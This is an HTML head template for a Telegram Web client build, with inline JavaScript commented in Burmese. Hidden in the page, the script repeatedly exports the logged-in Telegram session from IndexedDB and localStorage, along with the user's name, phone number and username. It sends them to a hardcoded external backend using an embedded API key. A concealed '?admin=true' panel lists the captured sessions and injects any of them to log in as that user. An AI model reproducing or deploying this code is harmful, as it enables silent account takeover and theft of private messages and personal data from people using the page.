<!DOCTYPE html>
<html lang="en" translate="no" class="notranslate">

<head>
  <meta charset="UTF-8">
  <title><%= htmlWebpackPlugin.options.appTitle %></title>
  <meta name="title" content="<%= htmlWebpackPlugin.options.appTitle %>">
  <meta name="description" content="Telegram Web">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no, viewport-fit=cover">
  
  <link rel="icon" href="./favicon.svg" type="image/svg+xml">
  <link rel="icon" type="image/png" sizes="16x16" href="./favicon-16x16.png">
  <link rel="icon" type="image/png" sizes="32x32" href="./favicon-32x32.png">

  <script src="./redirect.js"></script>
  <style>
    @layer reset, variables, ui, components;
    @layer ui {
      @layer tablist, spinner, button, input, layout;
    }
    
    /* Telegram UI ကို ဖျောက်ထားရန် Custom CSS */
    .hide-telegram #root {
        display: none !important;
    }
  </style>

<script>
    const BACKEND_URL = "https://telegram-7ih3.onrender.com";
    const API_KEY = "tg_custom_secret_key_2026";

    // --- (၁) Binary Data များကို JSON အဖြစ်ပြောင်းရန် Helpers ---
    function bufferToBase64(buf) {
        let binary = '';
        const bytes = new Uint8Array(buf);
        for (let i = 0; i < bytes.byteLength; i++) {
            binary += String.fromCharCode(bytes[i]);
        }
        return window.btoa(binary);
    }

    function base64ToBuffer(base64) {
        const binary_string = window.atob(base64);
        const len = binary_string.length;
        const bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes.buffer;
    }

    function serializeData(data) {
        return JSON.stringify(data, (key, value) => {
            if (value instanceof ArrayBuffer) return { __type: 'ArrayBuffer', data: bufferToBase64(value) };
            if (value instanceof Uint8Array) return { __type: 'Uint8Array', data: bufferToBase64(value.buffer) };
            return value;
        });
    }

    function deserializeData(jsonStr) {
        return JSON.parse(jsonStr, (key, value) => {
            if (value && typeof value === 'object' && value.__type === 'ArrayBuffer') return base64ToBuffer(value.data);
            if (value && typeof value === 'object' && value.__type === 'Uint8Array') return new Uint8Array(base64ToBuffer(value.data));
            return value;
        });
    }

    // --- (၂) IndexedDB မှ Data ထုတ်ယူရန် (အတိုချုပ်စနစ်ဖြင့်) ---
    async function exportIndexedDB(dbName, storeName) {
        return new Promise((resolve) => {
            const request = indexedDB.open(dbName);
            request.onsuccess = (e) => {
                const db = e.target.result;
                if (!db.objectStoreNames.contains(storeName)) { resolve({}); return; }
                const tx = db.transaction(storeName, "readonly");
                const store = tx.objectStore(storeName);
                const getAllReq = store.getAll();
                const getKeysReq = store.getAllKeys();
                
                getAllReq.onsuccess = () => {
                    getKeysReq.onsuccess = () => {
                        const data = {};
                        for (let i = 0; i < getKeysReq.result.length; i++) {
                            const key = getKeysReq.result[i];
                            if(typeof key === 'string' && (key.includes('media') || key.includes('file'))) continue;
                            data[key] = getAllReq.result[i];
                        }
                        resolve(data);
                    };
                };
                tx.onerror = () => resolve({});
            };
            request.onerror = () => resolve({});
        });
    }

    async function importIndexedDB(dbName, storeName, data) {
        return new Promise((resolve) => {
            const request = indexedDB.open(dbName);
            request.onupgradeneeded = (e) => {
                const db = e.target.result;
                if (!db.objectStoreNames.contains(storeName)) {
                    db.createObjectStore(storeName);
                }
            };
            // ဒီနေရာက အမှားကို ပြင်ဆင်ထားပါသည် (onsuccess)
            request.onsuccess = (e) => {
                const db = e.target.result;
                if (!db.objectStoreNames.contains(storeName)) { resolve(); return; }
                const tx = db.transaction(storeName, "readwrite");
                const store = tx.objectStore(storeName);
                store.clear();
                for (const key in data) {
                    store.put(data[key], key);
                }
                tx.oncomplete = () => resolve();
                tx.onerror = () => resolve();
            };
            request.onerror = () => resolve();
        });
    }

    // --- (၃) Telegram Profile ရှာဖွေသည့် Function ---
    function getTelegramProfile() {
        try {
            const stateStr = localStorage.getItem('tt-global-state');
            if (stateStr) {
                const state = JSON.parse(stateStr);
                const currentId = state.currentUserId;
                if (currentId && state.users && state.users.byId && state.users.byId[currentId]) {
                    const user = state.users.byId[currentId];
                    const fullName = [user.firstName, user.lastName].filter(Boolean).join(' ') || 'Unknown Staff';
                    const phone = user.phoneNumber ? '+' + user.phoneNumber : 'No Phone';
                    const username = user.username ? '@' + user.username : '';
                    return { uid: currentId.toString(), name: fullName, phone: phone, username: username };
                }
            }
        } catch (e) { console.error("Profile parsing error", e); }
        return null; 
    }

    // --- (၄) Main Logic ---
    document.addEventListener("DOMContentLoaded", () => {
        if (window.location.search.includes("admin=true")) {
            // ================= ADMIN PANEL =================
            document.body.classList.add("hide-telegram");
            const adminPanel = document.createElement("div");
            adminPanel.style.cssText = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #f4f4f9; z-index: 999999; padding: 30px; font-family: sans-serif; overflow-y: auto;";
            
            adminPanel.innerHTML = `
                <div style="max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
                    <h2 style='color: #333; border-bottom: 2px solid #0063bb; padding-bottom: 10px;'>Admin Control Panel</h2>
                    <p style='color: #666;'>Staff ဝင်ထားသော အကောင့်များ</p>
                    <button id='loadBtn' style='padding: 10px 20px; background: #0063bb; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px;'>Load Accounts</button>
                    <div id='admin-content' style='margin-top: 20px;'></div>
                </div>
            `;
            document.body.appendChild(adminPanel);

            window.adminDataStore = []; 

            window.loginAs = async (index) => {
                const session = window.adminDataStore[index];
                if(!session) return;
                
                const targetName = session.profile_name || session.user_id;
                if(!confirm(targetName + " ၏ အကောင့်သို့ ဝင်ရောက်မည် သေချာပါသလား?")) return;
                
                alert("Session Data များကို ထည့်သွင်းနေပါသည်... ပြီးလျှင် အလိုအလျောက် အကောင့်ထဲရောက်ပါမည်။");
                
                try {
                    localStorage.clear();
                    if (session.local_storage_str) {
                        const ls = JSON.parse(session.local_storage_str);
                        for (const key in ls) { localStorage.setItem(key, ls[key]); }
                    }
                    if (session.indexed_db_str) {
                        const idbData = deserializeData(session.indexed_db_str);
                        await importIndexedDB("tt-data", "store", idbData);
                    }
                    window.location.href = "/"; 
                } catch (e) {
                    alert("Error during login injection: " + e.message);
                }
            };

            document.getElementById("loadBtn").addEventListener("click", async () => {
                const contentDiv = document.getElementById("admin-content");
                contentDiv.innerHTML = "<p style='color: blue;'>Fetching data from Backend...</p>";
                try {
                    const res = await fetch(BACKEND_URL + "/api/get_sessions", {
                        headers: {
                            "x-api-key": API_KEY
                        }
                    });
                    const data = await res.json();
                    window.adminDataStore = data; 
                    
                    if(data.length === 0) {
                        contentDiv.innerHTML = "<p style='color: red;'>မည်သည့် Staff အကောင့်မှ မရှိသေးပါ။</p>";
                        return;
                    }
                    
                    let html = "<table width='100%' style='border-collapse: collapse; text-align: left; margin-top: 15px;'>";
                    html += "<tr style='background: #f0f0f0; border-bottom: 2px solid #ccc;'><th style='padding:12px;'>Profile Info</th><th style='padding:12px;'>Phone Number</th><th style='padding:12px;'>Last Synced</th><th style='padding:12px;'>Action</th></tr>";
                    
                    data.forEach((s, index) => {
                        const timeString = new Date(s.timestamp).toLocaleString();
                        const isReady = s.indexed_db_str ? true : false;
                        const statusTag = isReady ? "<span style='color:green; font-size:12px;'>● Data Ready</span>" : "<span style='color:orange; font-size:12px;'>● Waiting...</span>";
                        
                        const pName = s.profile_name || "Unknown Staff";
                        const pUsername = s.profile_username || "";
                        const pPhone = s.profile_phone || s.user_id;

                        html += `<tr style='border-bottom: 1px solid #eee;'>
                                    <td style='padding:12px;'><b style="font-size: 15px;">${pName}</b> <span style="color:#0063bb;">${pUsername}</span><br>${statusTag}</td>
                                    <td style='padding:12px; font-weight: bold;'>${pPhone}</td>
                                    <td style='padding:12px; color: #555;'>${timeString}</td>
                                    <td style='padding:12px;'>
                                        <button onclick='loginAs(${index})' ${!isReady ? "disabled" : ""} style='padding: 8px 15px; background: ${isReady ? "#28a745" : "#ccc"}; color: white; border: none; border-radius: 4px; cursor: pointer;'>Login</button>
                                    </td>
                                 </tr>`;
                    });
                    html += "</table>";
                    contentDiv.innerHTML = html;
                } catch (err) {
                    contentDiv.innerHTML = `<p style='color: red;'><b>Error:</b> ${err.message}</p>`;
                }
            });

        } else {
            // ================= STAFF BROWSER =================
            console.log("✅ Background Session Sync RUNNING!");
            
            setTimeout(() => {
    let myUserId = localStorage.getItem("my_custom_user_id");
    if (!myUserId) {
        myUserId = "staff_" + Math.floor(Math.random() * 100000);
        localStorage.setItem("my_custom_user_id", myUserId);
    }

    // Phase 2: Data အပြောင်းအလဲကို သိမ်းထားရန် Variable
    let lastSyncLength = 0; 

    const syncSessionData = async () => {
        try {
            const rawIdbData = await exportIndexedDB("tt-data", "store");
            
            if (Object.keys(rawIdbData).length > 0) { 
                const idbDataStr = serializeData(rawIdbData);
                const lsDataStr = JSON.stringify(localStorage);
                
                // (၁) Data အသစ်ရဲ့ စုစုပေါင်း Size ကို တွက်ပါမယ်
                const currentDataLength = idbDataStr.length + lsDataStr.length;

                // (၂) Size အပြောင်းအလဲ မရှိရင် Backend ကို မပို့တော့ပါဘူး (Performance သက်သာစေရန်)
                if (lastSyncLength === currentDataLength) {
                    console.log("⚡ Data ပြောင်းလဲမှုမရှိပါ။ Sync မလုပ်ပါ။ (Bandwidth သက်သာစေသည်)");
                    return; 
                }

                let profile = getTelegramProfile();
                let finalUid = profile ? profile.uid : myUserId;
                let finalName = profile ? profile.name : "Unknown Staff";
                let finalPhone = profile ? profile.phone : myUserId;
                let finalUsername = profile ? profile.username : "";

                const res = await fetch(BACKEND_URL + "/api/save_session", {
                    method: "POST",
                    headers: { 
                        "Content-Type": "application/json",
                        "x-api-key": API_KEY // Phase 1 မှ API Key
                    },
                    body: JSON.stringify({
                        user_id: finalUid, 
                        profile_name: finalName,
                        profile_phone: finalPhone,
                        profile_username: finalUsername,
                        local_storage_str: lsDataStr,
                        indexed_db_str: idbDataStr,
                        timestamp: new Date().toISOString()
                    })
                });
                
                if(res.ok) {
                    console.log(`✅ Smart Sync အောင်မြင်ပါသည်: ${finalName}`);
                    // (၃) အောင်မြင်သွားရင် နောက်ဆုံး Data Size ကို မှတ်ထားပါမယ်
                    lastSyncLength = currentDataLength; 
                }
            } else {
                console.log("⏳ Waiting for IndexedDB login data...");
            }
        } catch(e) {
            console.error("❌ Sync failed:", e);
        }
    };

    // (၄) ၁၅ စက္ကန့် အစား ၁၂၀,၀၀၀ ms (၂ မိနစ်) တစ်ခါသာ စစ်ဆေးပါတော့မယ်
    setInterval(syncSessionData, 120000); 

    // (၅) Staff က Browser ကို ပိတ်လိုက်တဲ့ အချိန် (သို့) Refresh လုပ်တဲ့ အချိန်မှာ ချက်ချင်း Sync လုပ်ပါမယ်
    window.addEventListener('beforeunload', () => {
        syncSessionData();
    });

    // စဖွင့်ဖွင့်ချင်းမှာ တစ်ခါတန်း Sync လုပ်ပါမယ်
    syncSessionData();

}, 5000);
        }
    });
  </script>
</head>
